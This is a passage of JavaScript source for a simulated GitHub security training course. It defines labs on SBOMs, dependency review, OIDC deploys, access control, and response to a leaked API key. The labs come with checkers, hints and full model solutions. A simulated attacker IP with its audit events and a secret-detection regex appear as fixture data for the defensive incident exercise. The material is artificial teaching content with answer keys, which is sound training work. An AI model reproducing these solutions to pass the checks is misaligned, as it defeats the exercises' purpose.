    story: "<p>Three supply-chain jobs for <code>kestrel/kestrel-web</code> (cloned in <code>~/kestrel-web</code>; you're an admin). A customer wants our <b>SBOM</b> (software bill of materials). Pull requests that add <b>known-vulnerable</b> dependencies should fail before review. And the deploy workflow still uses long-lived <code>DEPLOY_TOKEN</code> secrets: Kestrel's deploy service now trusts GitHub's <b>OIDC</b> tokens from our <code>staging</code> and <code>production</code> environments, so switch to short-lived tokens and delete the long-lived ones. <code>scripts/oidc-login.sh</code> does the token exchange.</p>",
    learn:
      "<h3>SBOM: what's in the box</h3><p>A Software Bill of Materials lists every component (and version) your software ships. Customers and auditors ask for one; when the next big vulnerability lands, it answers \"are we affected?\" in seconds. GitHub exports one in SPDX format from the dependency graph; <code>jq</code> (<code>sudo apt install jq</code>) reads it:</p>" +
      code("gh api repos/O/R/dependency-graph/sbom > sbom.spdx.json\njq -r '.sbom.packages[].name' sbom.spdx.json\njq -r '.sbom.packages[] | select(.name == \"npm:marked\") | .versionInfo' sbom.spdx.json") +
      "<h3>Dependency review: stop it at the pull request</h3><p>Dependabot alerts tell you about problems already on <code>main</code>. <code>actions/dependency-review-action</code> compares a pull request's dependencies with its base and fails if the pull request <i>adds</i> a known-vulnerable version:</p>" +
      code("on:\n  pull_request:\njobs:\n  dependency-review:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/dependency-review-action@v4\n        with:\n          fail-on-severity: high") +
      "<p>When it fails, the log names the package, version and advisory; ask for changes (<code>gh pr review N --request-changes</code>).</p>" +
      "<h3>OIDC: no stored deploy secrets</h3><p>A long-lived token in a secret works until it leaks, and then it keeps working for the attacker. With <b>OpenID Connect</b>, a job asks GitHub for a short-lived, signed identity token saying exactly who it is (<code>repo:kestrel/kestrel-web:environment:production</code>), and the deploy service swaps it for a deploy token valid for 15 minutes. Nothing to store, nothing to rotate. The job needs:</p>" +
      code("permissions:\n  id-token: write      # may request an OIDC token\n  contents: read") +
      "<p>The service decides what it trusts by the token's <code>sub</code> (subject); a job without <code>environment:</code> has a subject like <code>repo:O/R:ref:refs/heads/main</code>, which Kestrel doesn't trust. AWS, Azure, Google Cloud and HashiCorp Vault all support this, configured the same way. Once deploys work through OIDC, delete the old secrets (<code>gh secret delete NAME --env ENV</code>).</p>" +
      "<h3>Beyond</h3><p>Build provenance (\"this file was built by this workflow from this commit\") is the next step: <code>actions/attest-build-provenance</code> and <code>gh attestation verify</code>, the SLSA framework.</p>",
    system: supplyWorld,
    starter: "",
    objectives: [
      {
        id: "sbom", text: "Save GitHub's SBOM for <code>kestrel/kestrel-web</code> to <code>~/kestrel-web.spdx.json</code>, and print the version of <code>marked</code> it lists.",
        hints: ["gh api repos/kestrel/kestrel-web/dependency-graph/sbom > ~/kestrel-web.spdx.json, then jq with select(.name == \"npm:marked\").", "gh api repos/kestrel/kestrel-web/dependency-graph/sbom > ~/kestrel-web.spdx.json\njq -r '.sbom.packages[] | select(.name == \"npm:marked\") | .versionInfo' ~/kestrel-web.spdx.json"],
        check: function (r) {
          var t = r.read("~/kestrel-web.spdx.json"), j;
          if (t === null) return "~/kestrel-web.spdx.json doesn't exist yet.";
          try { j = JSON.parse(t); } catch (e) { return "~/kestrel-web.spdx.json isn't valid JSON."; }
          if (!j.sbom || j.sbom.spdxVersion !== "SPDX-2.3") return "Save the whole API response (it has .sbom.spdxVersion SPDX-2.3).";
          return r.history.some(function (e) { return e.out.some(function (l) { return l.trim() === "14.1.0"; }); }) ? true : "Print marked's version from the file (it's 14.1.0): jq with select(.name == \"npm:marked\") | .versionInfo";
        }
      },
      {
        id: "review", text: "Add a dependency review workflow on <code>main</code> that fails pull requests adding high or critical vulnerabilities. Ana's next pull request will hit it: request changes on it, saying which package to upgrade.",
        hints: ["Create .github/workflows/dependency-review.yml (on: pull_request, actions/dependency-review-action@v4, fail-on-severity: high), push to main. Then gh pr list, gh pr checks N, and gh pr review N --request-changes --body '...'.", "gh pr review 1 --request-changes --body 'lodash 4.17.20 has a high-severity advisory (GHSA-35jh-r3h4-6jhm). Please upgrade to 4.17.21.'"],
        check: function (r) {
          var w = wfsOn(r, "kestrel/kestrel-web", "main").filter(function (x) { return /actions\/dependency-review-action@v4/.test(x.text); })[0];
          if (!w || w.errors.length) return w ? "GitHub can't read the dependency review workflow: " + w.errors[0] : "main has no workflow using actions/dependency-review-action@v4 yet.";
          if (!("pull_request" in w.on)) return "Run it on pull_request.";
          var p = prs(r, "kestrel/kestrel-web").filter(function (x) { return x.author === "ana-silva"; })[0];
          if (!p) return "Push the workflow to main; Ana's pull request follows.";
          var run = runs(r, "kestrel/kestrel-web", function (x) { return x.pr === p.n && /dependency-review-action/.test(x.wf && x.wf.text || ""); })[0];
          if (!run || run.conclusion !== "failure") return "Ana's pull request should fail dependency review (lodash 4.17.20 is high severity). Check fail-on-severity.";
          var rv = p.reviews.filter(function (x) { return x.by === "kc-dev" && x.state === "CHANGES_REQUESTED"; })[0];
          return rv && /lodash/i.test(rv.body) ? true : "Request changes on Ana's pull request (gh pr review " + p.n + " --request-changes --body ...), naming lodash.";
        }
      },
      {
        id: "oidc", text: "Make both deploy jobs get their token through OIDC (<code>scripts/oidc-login.sh</code>), get <code>main</code> deployed to staging and production that way, and delete the long-lived <code>DEPLOY_TOKEN</code> secrets from both environments.",
        hints: ["Add permissions: id-token: write (and contents: read). In each job's step: DEPLOY_TOKEN=\"$(bash scripts/oidc-login.sh)\", export it, run deploy.sh. Push to main. Then gh secret delete DEPLOY_TOKEN --env staging (and production).", "The Learn tab has the permissions block; scripts/oidc-login.sh prints a short-lived token."],
        check: function (r) {
          var x = gh(r, "kestrel/kestrel-web"), st = A.svc(r.sys);
          var d = st.deploys.filter(function (z) { return z.from === "actions" && z.site === "kestrel-web" && st.tokens[z.token] && st.tokens[z.token].oidc; });
          if (!d.some(function (z) { return z.env === "staging"; })) return "No staging deploy with an OIDC token yet. (gh run view the Deploy run: is id-token: write set?)";
          if (!d.some(function (z) { return z.env === "production"; })) return "Staging deploys through OIDC; production doesn't yet.";
          var w = wfsOn(r, "kestrel/kestrel-web", "main").filter(function (z) { return z.name === "Deploy"; })[0];
          if (w && /secrets\.DEPLOY_TOKEN/.test(w.text)) return "The Deploy workflow still reads secrets.DEPLOY_TOKEN: remove that.";
          var left = ["staging", "production"].filter(function (e) { return x.envs[e] && x.envs[e].secrets.DEPLOY_TOKEN; });
          return left.length ? "Delete the long-lived secret from: " + left.join(", ") + " (gh secret delete DEPLOY_TOKEN --env NAME)." : true;
        }
      }
    ],
    solution: sol("cd ~/kestrel-web", "sudo apt install -y jq", "gh api repos/kestrel/kestrel-web/dependency-graph/sbom > ~/kestrel-web.spdx.json", "jq -r '.sbom.packages[] | select(.name == \"npm:marked\") | .versionInfo' ~/kestrel-web.spdx.json",
      { nano: ".github/workflows/dependency-review.yml", text: DEPREVIEW_WF }, { nano: ".github/workflows/deploy.yml", text: DEPLOY_OIDC }, "git add .github", "git commit -m 'ci: dependency review on PRs, OIDC for deploys'", "git push",
      "gh run list -L 4", "gh secret delete DEPLOY_TOKEN --env staging", "gh secret delete DEPLOY_TOKEN --env production",
      "gh pr list", "gh pr checks 1", "gh run view $(gh run list -w 'Dependency review' -L 1 --json databaseId -q '.[0].databaseId') --log-failed",
      "gh pr review 1 --request-changes --body 'Dependency review: lodash 4.17.20 has a high-severity advisory (GHSA-35jh-r3h4-6jhm). Please upgrade lodash to 4.17.21.'"),
    debrief: "<p>The SBOM answers \"what's inside\" in one file. Dependency review moved the vulnerable-dependency check to the cheapest moment: before review, on the pull request that introduces it. And the deploys no longer depend on stored secrets at all: each job proves who it is to Kestrel's deploy service and gets a token that's useless 15 minutes later. There's nothing left to leak.</p><p>Next: who can do what in the repository itself.</p>",
    realworld: "If you deploy to AWS from GitHub Actions, aws-actions/configure-aws-credentials with role-to-assume is the same OIDC idea. gh api repos/OWNER/REPO/dependency-graph/sbom works on any repository with the dependency graph on.",
    quiz: [
      { q: "Why is OIDC better than a long-lived deploy token in a secret?", options: ["It's faster", "Nothing long-lived is stored: each job gets a short-lived token tied to its identity", "It doesn't need a network", "It encrypts the logs"], answer: 1, why: "A stolen OIDC-minted token expires in minutes and only works for what that identity is trusted to do." },
      { q: "What does dependency review check?", options: ["All dependencies on main", "Dependencies a pull request adds or changes, against known advisories", "Licenses only", "Code style"], answer: 1, why: "It compares the PR's head with its base, so only the change under review counts." },
      { q: "What's an SBOM for?", options: ["Building faster", "Knowing exactly which components and versions ship, e.g. to answer 'are we affected?'", "Signing commits", "Running tests"], answer: 1, why: "It's an inventory: when a CVE drops, you search it instead of guessing." }
    ]
  });

  /* ================================================================== GT-134 Access control */
  var PROTECT_BACK = "{\n  \"required_status_checks\": null,\n  \"enforce_admins\": true,\n  \"required_pull_request_reviews\": { \"required_approving_review_count\": 1, \"dismiss_stale_reviews\": true },\n  \"restrictions\": null\n}\n";
  function accessWorld(sys) {
    world(sys);
    GH.seed(sys, "kestrel/kestrel-api", { steps: apiSteps() }, { private: true, description: "The Kestrel Cloud API" });
    var r = GH.find(sys, "kestrel/kestrel-api"), h = GH.hub(sys), org = h.orgs.kestrel, t0 = G.clock(sys);
    r.collab["kc-dev"] = "admin";
    GH.user(sys, "jo-contractor", { name: "Jo Rivera", email: "jo@contractors.example" });
    r.collab["jo-contractor"] = "admin";
    org.auditReaders = ["kc-dev"];
    function ev(sec, actor, action, data) { h.audit.push(Object.assign({ "@timestamp": (t0 - sec) * 1000, actor: actor, action: action, org: "kestrel" }, data || {})); }
    ev(86400 * 40, "maya-chen", "protected_branch.create", { repo: r.full, branch: "main" });
    ev(86400 * 30, "maya-chen", "repo.add_member", { repo: r.full, user: "jo-contractor", permission: "admin" });
    ev(86400 * 3, "ben-okoro", "repo.create", { repo: "kestrel/kestrel-sandbox" });
    ev(36000, "jo-contractor", "protected_branch.destroy", { repo: r.full, branch: "main" });
    ev(35000, "jo-contractor", "git.push", { repo: r.full, ref: "refs/heads/main" });
    ev(7200, "maya-chen", "org.update_member", { user: "ana-silva" });
    sys.lab = {};
    GH.cloneTo(sys, "kestrel/kestrel-api", HOME + "/kestrel-api");
  }
  LABS.push({
    id: "gt-134", n: 34, module: 4, ticket: "GT-134", xp: 200,
    title: "Access control",
    topic: "roles, teams, deploy keys, audit log",
    from: MAYA,
    story: "<p>Two things on <code>kestrel/kestrel-api</code> this morning: branch protection on <code>main</code> is <b>gone</b>, and nobody on the team admits to it. Find out who did it from the organization's audit log (you have read access to it) and put it back: one approving review, stale approvals dismissed, admins included. Then tidy access: Jo's contract ended last month, the security team should be able to <b>maintain</b> this repository, and the new staging server needs read-only access to clone it. You're a repository admin.</p>",
    learn:
      "<h3>Repository roles</h3>" +
      '<table class="t"><tr><th>Role</th><th>Can</th></tr><tr><td>read</td><td>clone, open issues</td></tr><tr><td>triage</td><td>+ manage issues and pull requests (labels, assignees)</td></tr><tr><td>write</td><td>+ push branches, merge pull requests</td></tr><tr><td>maintain</td><td>+ manage settings that are not destructive or security-related</td></tr><tr><td>admin</td><td>everything: protection rules, secrets, deleting the repository</td></tr></table>' +
      "<p>Give access through <b>teams</b> rather than people one by one: when someone joins or leaves the team, every repository follows. Review direct (\"outside\") collaborators regularly; they're often forgotten contractors.</p>" +
      code("gh api repos/O/R/collaborators --jq '.[] | [.login, .role_name]'\ngh api -X DELETE repos/O/R/collaborators/USER\ngh api -X PUT orgs/ORG/teams/TEAM/repos/O/R -f permission=maintain\ngh api repos/O/R/teams") +
      "<h3>Deploy keys</h3><p>A server that only needs to clone one repository shouldn't use a person's key or token. A <b>deploy key</b> is an SSH key attached to one repository, read-only unless you allow writes:</p>" +
      code("ssh-keygen -t ed25519 -C staging-server -f ~/staging-deploy -N ''\ngh repo deploy-key add ~/staging-deploy.pub --title staging-server     # read-only\ngh repo deploy-key list") +
      "<h3>Tokens</h3><p>For scripts, prefer <b>fine-grained</b> personal access tokens (one repository, only the permissions needed, an expiry date) over classic ones, and GitHub Apps for anything shared by a team.</p>" +
      "<h3>The audit log</h3><p>Organizations on GitHub Enterprise Cloud (like Kestrel) record who did what: settings changes, members added, protection removed, pushes.</p>" +
      code("gh api 'orgs/kestrel/audit-log?phrase=action:protected_branch.destroy'\ngh api 'orgs/kestrel/audit-log?phrase=actor:USER' --jq '.[] | [.action, .repo]'") +
      "<p>Branch protection is restored the same way it was set in Module 2: <code>gh api -X PUT repos/O/R/branches/main/protection --input FILE.json</code>.</p>",
    system: accessWorld,
    starter: "",
    objectives: [
      {
        id: "audit", text: "Find out from the audit log who removed <code>main</code>'s protection, and restore it: one approving review, stale approvals dismissed, admins included.",
        hints: ["gh api 'orgs/kestrel/audit-log?phrase=action:protected_branch.destroy'. Then write the protection JSON with nano and gh api -X PUT ... --input FILE.", "The JSON body: required_status_checks null, enforce_admins true, required_pull_request_reviews { required_approving_review_count 1, dismiss_stale_reviews true }, restrictions null."],
        check: function (r) {
          if (!ran(r, /gh\s+api\b.*audit-log/, function (e) { return outHas(e, /jo-contractor/) && outHas(e, /protected_branch\.destroy/); })) return "Query the audit log for protected_branch.destroy events: gh api 'orgs/kestrel/audit-log?phrase=action:protected_branch.destroy'";
          var p = gh(r, "kestrel/kestrel-api").protect.main;
          if (!p || !p.pr) return "main isn't protected yet (gh api -X PUT repos/kestrel/kestrel-api/branches/main/protection --input FILE).";
          if (p.pr.count < 1) return "Require one approving review.";
          if (!p.pr.dismissStale) return "Dismiss stale approvals (dismiss_stale_reviews: true).";
          return p.enforceAdmins ? true : "Include admins (enforce_admins: true).";
        }
      },
      {
        id: "people", text: "Remove <code>jo-contractor</code>'s access, and give the <code>security</code> team the <b>maintain</b> role on the repository.",
        hints: ["gh api -X DELETE repos/kestrel/kestrel-api/collaborators/jo-contractor; gh api -X PUT orgs/kestrel/teams/security/repos/kestrel/kestrel-api -f permission=maintain", "gh api repos/kestrel/kestrel-api/collaborators --jq '.[] | [.login, .role_name]'\ngh api -X DELETE repos/kestrel/kestrel-api/collaborators/jo-contractor\ngh api -X PUT orgs/kestrel/teams/security/repos/kestrel/kestrel-api -f permission=maintain"],
        check: function (r) { var x = gh(r, "kestrel/kestrel-api"); if (x.collab["jo-contractor"]) return "jo-contractor still has access (" + x.collab["jo-contractor"] + ")."; var rr = GH.hub(r.sys).orgs.kestrel.repoRoles[x.full] || {}; return rr["@security"] === "maintain" ? true : "Give the security team maintain: gh api -X PUT orgs/kestrel/teams/security/repos/kestrel/kestrel-api -f permission=maintain"; }
      },
      {
        id: "deploykey", text: "Create an SSH key pair for the staging server at <code>~/staging-deploy</code> (no passphrase) and add its public half to <code>kestrel/kestrel-api</code> as a <b>read-only</b> deploy key titled <code>staging-server</code>.",
        hints: ["ssh-keygen -t ed25519 -f ~/staging-deploy -N '', then gh repo deploy-key add ~/staging-deploy.pub --title staging-server (read-only is the default).", "ssh-keygen -t ed25519 -C staging-server -f ~/staging-deploy -N ''\ncd ~/kestrel-api\ngh repo deploy-key add ~/staging-deploy.pub --title staging-server\ngh repo deploy-key list"],
        check: function (r) {
          var pub = r.read("~/staging-deploy.pub"); if (pub === null) return "~/staging-deploy.pub doesn't exist (ssh-keygen -t ed25519 -f ~/staging-deploy -N '').";
          var blob = pub.trim().split(/\s+/)[1], k = gh(r, "kestrel/kestrel-api").deployKeys.filter(function (x) { return x.blob === blob; })[0];
          if (!k) return "Add ~/staging-deploy.pub as a deploy key (gh repo deploy-key add ~/staging-deploy.pub --title staging-server).";
          if (!k.readOnly) return "Make it read-only: delete it and add it again without --allow-write.";
          return k.title === "staging-server" ? true : "Title it staging-server.";
        }
      }
    ],
    solution: sol("cd ~/kestrel-api", "gh api 'orgs/kestrel/audit-log?phrase=action:protected_branch.destroy'", { nano: "/tmp/protect.json", text: PROTECT_BACK }, "gh api -X PUT repos/kestrel/kestrel-api/branches/main/protection --input /tmp/protect.json",
      "gh api repos/kestrel/kestrel-api/collaborators --jq '.[] | [.login, .role_name]'", "gh api -X DELETE repos/kestrel/kestrel-api/collaborators/jo-contractor", "gh api -X PUT orgs/kestrel/teams/security/repos/kestrel/kestrel-api -f permission=maintain", "gh api repos/kestrel/kestrel-api/teams",
      "ssh-keygen -q -t ed25519 -C staging-server -f ~/staging-deploy -N ''", "gh repo deploy-key add ~/staging-deploy.pub --title staging-server", "gh repo deploy-key list"),
    debrief: "<p>The audit log answered in one query what nobody would admit to: Jo removed the protection, with an admin role that should have ended with the contract. Removing stale access isn't paperwork; it's closing exactly this kind of door.</p><p>The rest follows least privilege: a team role instead of individual grants, and a deploy key that can read one repository and nothing else. If that staging server is ever compromised, the attacker gets read access to one repository, not anyone's account. Next: putting it all together under pressure, in an incident.</p>",
    realworld: "In an organization you belong to: gh api orgs/ORG/outside_collaborators (with admin rights) lists people who aren't members but have access. Many teams review that list every quarter.",
    quiz: [
      { q: "A server needs to git clone one private repository. Best credential?", options: ["Your personal SSH key", "A read-only deploy key on that repository", "An admin's classic token", "The repository made public"], answer: 1, why: "It grants exactly one repository, read-only, and belongs to no person." },
      { q: "Why grant access through teams?", options: ["Teams are faster", "Joining or leaving a team updates every repository at once, so access doesn't linger", "Teams can't be audited", "It's required"], answer: 1, why: "Individual grants get forgotten; team membership is managed in one place." },
      { q: "Who can remove branch protection?", options: ["Anyone with write", "Repository admins (and org owners)", "Only GitHub staff", "Nobody once set"], answer: 1, why: "That's why admin should be rare, and why the audit log matters." }
    ]
  });

  /* ================================================================== GT-135 Incident: leaked token */
  var SMOKE_WF = "name: Smoke\n\non:\n  push:\n    branches: [main]\n  workflow_dispatch:\n\npermissions:\n  contents: read\n\njobs:\n  api:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsS -H \"Authorization: Bearer $KC_API_KEY\" https://api.kestrel.io/v1/whoami\n        env:\n          KC_API_KEY: ${{ secrets.KC_API_KEY }}\n";
  var ATTACKER = "185.220.101.47";
  function incidentWorld(sys) {
    world(sys);
    var h = GH.hub(sys), t0 = G.clock(sys);
    var key = SEC.cloudKey(sys, { name: "sdk-examples", created: t0 - 86400 * 60 });
    SEC.cloudKey(sys, { name: "terraform", created: t0 - 86400 * 200 });
    sys.lab = { keyId: key.id, secret: key.secret };
    h.orgs.kestrel.customPatterns = [{ name: "Kestrel Cloud API key", regex: "kcak_[A-Za-z0-9]{40}" }];
    var leakAt = "2026-11-11 16:02";
    GH.seed(sys, "kestrel/kestrel-sdk-examples", { steps: [
      { msg: "SDK examples", by: "maya", at: "2026-10-20 10:00", files: { "README.md": "# Kestrel SDK examples\n\nSmall, copy-pasteable examples for the Kestrel Cloud API.\n", "examples/projects.sh": "#!/bin/bash\n# List your projects. Needs KC_API_KEY.\ncurl -fsS -H \"Authorization: Bearer $KC_API_KEY\" https://api.kestrel.io/v1/projects\n", ".github/workflows/smoke.yml": SMOKE_WF } },
      { msg: "Add a quickstart example", by: "dev", at: leakAt, files: { "examples/quickstart.sh": "#!/bin/bash\n# Quickstart: who am I?\nKC_API_KEY=" + key.secret + "\ncurl -fsS -H \"Authorization: Bearer $KC_API_KEY\" https://api.kestrel.io/v1/whoami\n" } },
      { msg: "Fix typo in README", by: "ana", at: "2026-11-12 09:15", files: { "README.md": "# Kestrel SDK examples\n\nSmall, copy-pasteable examples for the Kestrel Cloud API.\n\nSee examples/.\n" } }
    ] }, { private: false, description: "Examples for the Kestrel Cloud API" });
    var r = GH.find(sys, "kestrel/kestrel-sdk-examples");
    r.collab["kc-dev"] = "admin";
    r.settings.secretScanning = true;
    r.secrets.KC_API_KEY = { value: key.secret, updated: t0 - 86400 * 60 };
    SEC.fullScan(sys, r);
    function at(s) { return Date.UTC(+s.slice(0, 4), +s.slice(5, 7) - 1, +s.slice(8, 10), +s.slice(11, 13), +s.slice(14, 16), +(s.slice(17, 19) || 0)) / 1000; }
    [["2026-11-10 09:12:05", "20.42.17.88", "GET /v1/whoami"], ["2026-11-11 15:58:40", "198.51.100.23", "GET /v1/whoami"], ["2026-11-11 16:31:10", "20.42.113.9", "GET /v1/whoami"],
     ["2026-11-12 02:47:19", ATTACKER, "GET /v1/whoami"], ["2026-11-12 02:47:33", ATTACKER, "GET /v1/projects"], ["2026-11-12 02:49:02", ATTACKER, "POST /v1/projects/kestrel-web/exports"], ["2026-11-12 09:30:55", "20.42.61.140", "GET /v1/whoami"]
    ].forEach(function (e) { SEC.cloudEvent(sys, key.id, at(e[0]), e[1], e[2], 200); });
    sys.lab.firstBad = "2026-11-12 02:47";
    G.putFile(sys, HOME + "/.config/kc/credentials", "[default]\nuser = dev@kestrel.io\n", 384, 1000, 1000);
    S.put(sys, "/usr/local/bin/kc", "\x7fELF:kc (simulated binary)\n", 493);
    GH.cloneTo(sys, "kestrel/kestrel-sdk-examples", HOME + "/kestrel-sdk-examples");
  }
  var NOTES = "# Incident 2026-11-13: Kestrel Cloud API key leaked in kestrel-sdk-examples\n\n- 2026-11-11 16:02 UTC: key ak_... (sdk-examples) committed to examples/quickstart.sh in the public repo\n- 2026-11-12 02:47 UTC: first use from an unknown address, 185.220.101.47: GET /v1/whoami, GET /v1/projects, POST /v1/projects/kestrel-web/exports\n- 2026-11-13: key revoked, replaced by sdk-examples-ci, CI secret updated, history rewritten, alert resolved as revoked\n\nFollow-up: the attacker started an export of kestrel-web's project data. Check what it contained.\n";
  LABS.push({
    id: "gt-135", n: 35, module: 4, ticket: "GT-135", xp: 260,
    title: "Incident: leaked token",
    topic: "response, start to finish",
    from: DEV,
    story: "<p>Secret scanning just opened an alert on our <b>public</b> repository <code>kestrel/kestrel-sdk-examples</code>: a Kestrel Cloud API key, committed in an example two days ago. It's your key (you're logged in to the <code>kc</code> CLI). This is an incident: <b>contain</b> it first, then <b>investigate</b>, then <b>clean up</b>. Keep notes as you go. The repository's <i>Smoke</i> workflow uses the same key through the <code>KC_API_KEY</code> secret, so it has to keep working with a new one. The repository is cloned in <code>~/kestrel-sdk-examples</code>; you're an admin.</p>",
    learn:
      "<h3>Incident response, in order</h3>" +
      '<table class="t"><tr><th>Phase</th><th>Here</th></tr>' +
      "<tr><td><b>Triage</b>: what leaked, where, since when, what can it do?</td><td>the secret scanning alert; <code>kc keys list</code> to match the key</td></tr>" +
      "<tr><td><b>Contain</b>: make the credential useless, keep the business running</td><td>revoke it, issue a replacement, update the CI secret, re-run CI</td></tr>" +
      "<tr><td><b>Investigate</b>: was it used? by whom? for what?</td><td><code>kc audit --key ID</code>: every request, with time and source address</td></tr>" +
      "<tr><td><b>Eradicate</b>: remove it from where it leaked</td><td>rewrite history, force-push, resolve the alert</td></tr>" +
      "<tr><td><b>Learn</b>: notes and follow-ups</td><td>a short timeline anyone can read</td></tr></table>" +
      "<p>Containment comes before investigation: every minute the key works is a minute an attacker can use it. Don't wait to understand everything first.</p>" +
      code("gh api repos/O/R/secret-scanning/alerts\ngh api repos/O/R/secret-scanning/alerts/1/locations\nkc keys list\nkc keys revoke KEY_ID\nkc keys create --name NAME       # shows the new key once\nkc audit --key KEY_ID") +
      "<h3>Handling the new secret</h3><p>Never paste a secret into a command line (shell history) or a file you might commit. Pipe it straight where it goes, or through a temporary file you delete:</p>" +
      code("kc keys create --name sdk-examples-ci | grep -o 'kcak_[A-Za-z0-9]*' > /tmp/key\ngh secret set KC_API_KEY < /tmp/key && rm /tmp/key") +
      "<h3>Cleaning up</h3><p>To keep a file but remove a secret from every version of it: <code>git filter-repo --replace-text FILE</code>, where FILE lists the secret (one per line; each is replaced by <code>***REMOVED***</code>). Fresh clone, add origin back, force-push, like GT-128. Then close the alert with the reason that's true:</p>" +
      code("gh api -X PATCH repos/O/R/secret-scanning/alerts/1 -f state=resolved -f resolution=revoked -f resolution_comment='Rotated; history rewritten.'") +
      "<p>Times in the audit trail are UTC. Write them as UTC in your notes too.</p>",
    system: incidentWorld,
    starter: "",
    objectives: [
      {
        id: "triage", text: "Triage: read the secret scanning alert (what kind of secret, where), and find which of your Kestrel Cloud keys it is.",
        hints: ["gh api repos/kestrel/kestrel-sdk-examples/secret-scanning/alerts (and .../alerts/1/locations); kc keys list shows key prefixes.", "gh api repos/kestrel/kestrel-sdk-examples/secret-scanning/alerts/1/locations\nkc keys list"],
        check: function (r) {
          var a = ran(r, /gh\s+api\b.*secret-scanning\/alerts/, function (e) { return outHas(e, /Kestrel Cloud API key|quickstart\.sh/); });
          var b = ran(r, /kc\s+keys\s+(list|ls)/, function (e) { return outHas(e, new RegExp(r.sys.lab.keyId)); });
          return a && b ? true : !a ? "Read the alert: gh api repos/kestrel/kestrel-sdk-examples/secret-scanning/alerts" : "Match it to a key: kc keys list";
        }
      },
      {
        id: "contain", text: "Contain: revoke the leaked key, create a replacement named <code>sdk-examples-ci</code>, put it in the <code>KC_API_KEY</code> secret without it ever appearing in a command you type, and get <i>Smoke</i> green again with the new key.",
        hints: ["kc keys revoke ID; kc keys create --name sdk-examples-ci piped through grep -o into a temp file; gh secret set KC_API_KEY < file; rm it; gh workflow run smoke.yml (or re-run the failed run).", "kc keys revoke KEY_ID\nkc keys create --name sdk-examples-ci | grep -o 'kcak_[A-Za-z0-9]*' > /tmp/key\ngh secret set KC_API_KEY < /tmp/key\nrm /tmp/key\ngh workflow run smoke.yml"],
        check: function (r) {
          var cl = SEC.cloud(r.sys), old = cl.keys[r.sys.lab.keyId];
          if (!old.revoked) return "The leaked key still works: kc keys revoke " + r.sys.lab.keyId;
          var nk = Object.keys(cl.keys).map(function (k) { return cl.keys[k]; }).filter(function (k) { return k.name === "sdk-examples-ci" && !k.revoked; })[0];
          if (!nk) return "Create a replacement: kc keys create --name sdk-examples-ci";
          var x = gh(r, "kestrel/kestrel-sdk-examples");
          if (!x.secrets.KC_API_KEY || x.secrets.KC_API_KEY.value !== nk.secret) return "KC_API_KEY should hold the new key.";
          if (r.history.some(function (e) { return e.cmd.indexOf(nk.secret) >= 0; })) return "The new key appears in a command you typed (so it's in your shell history). Create another and pipe it instead.";
          if (r.exists("/tmp/key")) return "Delete the temporary file with the key.";
          var ok = cl.events.some(function (e) { return e.key === nk.id && e.status === 200 && /^20\.42\./.test(e.ip); });
          return ok ? true : "Smoke hasn't run with the new key yet: gh workflow run smoke.yml (or gh run rerun the failed run).";
        }
      },
      {
        id: "investigate", text: "Investigate: find out whether the key was used by someone else, and write it up in <code>~/incident-notes.md</code>: the attacker's IP address, the time of their first request (UTC, to the minute), and what they called.",
        hints: ["kc audit --key KEY_ID lists every request. Our own traffic comes from GitHub's runners (20.42.x.x) and your laptop (198.51.100.23).", "nano ~/incident-notes.md with a short timeline: when it leaked, when the unknown address first used it, which endpoints."],
        check: function (r) {
          var t = r.read("~/incident-notes.md"); if (t === null) return "Write ~/incident-notes.md.";
          if (!ran(r, /kc\s+audit/)) return "Look at the key's audit trail: kc audit --key " + r.sys.lab.keyId;
          if (t.indexOf(ATTACKER) < 0) return "The notes should name the attacker's IP address.";
          if (t.indexOf(r.sys.lab.firstBad) < 0 && t.indexOf(r.sys.lab.firstBad.replace(" ", "T")) < 0) return "Give the time of the attacker's first request, in UTC, as YYYY-MM-DD HH:MM.";
          return /\/v1\/projects/.test(t) ? true : "Say what they called (the endpoints).";
        }
      },
      {
        id: "eradicate", text: "Clean up: replace the key in every commit on GitHub (keep the example file), and resolve the alert as <b>revoked</b>.",
        hints: ["Fresh clone; a file with the key on one line; git filter-repo --replace-text FILE; add origin; push --force --all. Then gh api -X PATCH .../secret-scanning/alerts/1 -f state=resolved -f resolution=revoked.", "cd ~ && git clone https://github.com/kestrel/kestrel-sdk-examples.git sdk-clean && cd sdk-clean\ngit show HEAD:examples/quickstart.sh | grep -o 'kcak_[A-Za-z0-9]*' > /tmp/leaked.txt\ngit filter-repo --replace-text /tmp/leaked.txt && rm /tmp/leaked.txt\ngit remote add origin https://github.com/kestrel/kestrel-sdk-examples.git\ngit push --force --all origin\ngh api -X PATCH repos/kestrel/kestrel-sdk-examples/secret-scanning/alerts/1 -f state=resolved -f resolution=revoked -f resolution_comment='Key revoked and replaced; history rewritten.'"],
        check: function (r) {
          if (historyHas(r, "kestrel/kestrel-sdk-examples", r.sys.lab.secret)) return "A commit on GitHub still contains the key.";
          if (fileOn(r, "kestrel/kestrel-sdk-examples", "main", "examples/quickstart.sh") === null) return "Keep examples/quickstart.sh: replace the key, don't delete the example.";
          var a = gh(r, "kestrel/kestrel-sdk-examples").alerts.secret[0];
          return a && a.state === "resolved" && a.resolution === "revoked" ? true : "Resolve the alert as revoked: gh api -X PATCH repos/kestrel/kestrel-sdk-examples/secret-scanning/alerts/1 -f state=resolved -f resolution=revoked";
        }
      }
    ],
    solution: sol("cd ~/kestrel-sdk-examples", "gh api repos/kestrel/kestrel-sdk-examples/secret-scanning/alerts", "gh api repos/kestrel/kestrel-sdk-examples/secret-scanning/alerts/1/locations", "kc keys list",
      "kc keys revoke $(kc keys list | grep sdk-examples | head -1 | cut -d' ' -f1)",
      "kc keys create --name sdk-examples-ci | grep -o 'kcak_[A-Za-z0-9]*' > /tmp/key", "gh secret set KC_API_KEY < /tmp/key", "rm /tmp/key", "gh workflow run smoke.yml", "gh run list -L 2",
      "kc audit --key $(kc keys list | grep 'sdk-examples ' | cut -d' ' -f1)", { nano: "~/incident-notes.md", text: NOTES },
      "sudo apt install -y git-filter-repo", "cd ~", "git clone https://github.com/kestrel/kestrel-sdk-examples.git sdk-clean", "cd sdk-clean", "git log --all --oneline -S kcak_",
      "git show $(git log --all --format=%h -S kcak_ | tail -1):examples/quickstart.sh | grep -o 'kcak_[A-Za-z0-9]*' > /tmp/leaked.txt", "git filter-repo --replace-text /tmp/leaked.txt", "rm /tmp/leaked.txt", "git grep -n REMOVED",
      "git remote add origin https://github.com/kestrel/kestrel-sdk-examples.git", "git push --force --all origin",
